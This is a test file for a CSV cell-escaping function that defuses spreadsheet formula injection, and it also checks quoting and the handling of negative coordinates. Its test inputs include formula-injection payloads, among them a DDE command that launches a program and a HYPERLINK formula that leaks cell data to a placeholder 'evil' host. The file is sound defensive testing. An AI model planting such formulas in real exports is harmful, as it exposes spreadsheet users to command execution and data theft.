import { describe, it, expect } from "vitest";
import { celdaCsv } from "./csv";

describe("celdaCsv", () => {
  it.each([
    ["=cmd|'/c calc.exe'!A1"],
    ['=HYPERLINK("http://evil/"&A1,"ver")'],
    ["+59170000000"],
    ["@SUM(A1:A9)"],
    ["-1+1"],
    ["\tvalor"],
  ])("defuses %j", (valor) => {
    const salida = celdaCsv(valor);
    // Quoted and prefixed: the apostrophe only reads as "text follows" inside a
    // quoted field, so one without the other is not a defence.
    expect(salida.startsWith(`"'`)).toBe(true);
    expect(salida.endsWith('"')).toBe(true);
  });

  it("leaves a plain negative number alone", () => {
    // 🔴 Every coordinate in these two reports is negative — Bolivia is south
    // and west — and they are written as `String(lat.toFixed(4))`, so the guard
    // would have caught all of them and turned the columns into text.
    expect(celdaCsv("-16.5023")).toBe("-16.5023");
    expect(celdaCsv("-68.1193")).toBe("-68.1193");
    // Written with a decimal comma it still has to be quoted — the comma is the
    // field separator — but it is not defused: no apostrophe, so it stays a
    // number for the reader.
    expect(celdaCsv("-16,5023")).toBe('"-16,5023"');
  });

  it("still quotes what CSV requires quoting, and doubles the quotes", () => {
    expect(celdaCsv("Sucre, Chuquisaca")).toBe('"Sucre, Chuquisaca"');
    expect(celdaCsv('dice "hola"')).toBe('"dice ""hola"""');
    expect(celdaCsv("dos\nlíneas")).toBe('"dos\nlíneas"');
  });

  it("leaves an ordinary value untouched and unquoted", () => {
    expect(celdaCsv("Poste 14")).toBe("Poste 14");
    expect(celdaCsv("")).toBe("");
  });

  it("quotes a semicolon too, which the copies it replaces did not", () => {
    // A semicolon is the field separator a Spanish-locale Excel writes, so an
    // unquoted one is a cell that splits in two for some readers and not others.
    expect(celdaCsv("uno; dos")).toBe('"uno; dos"');
  });
});
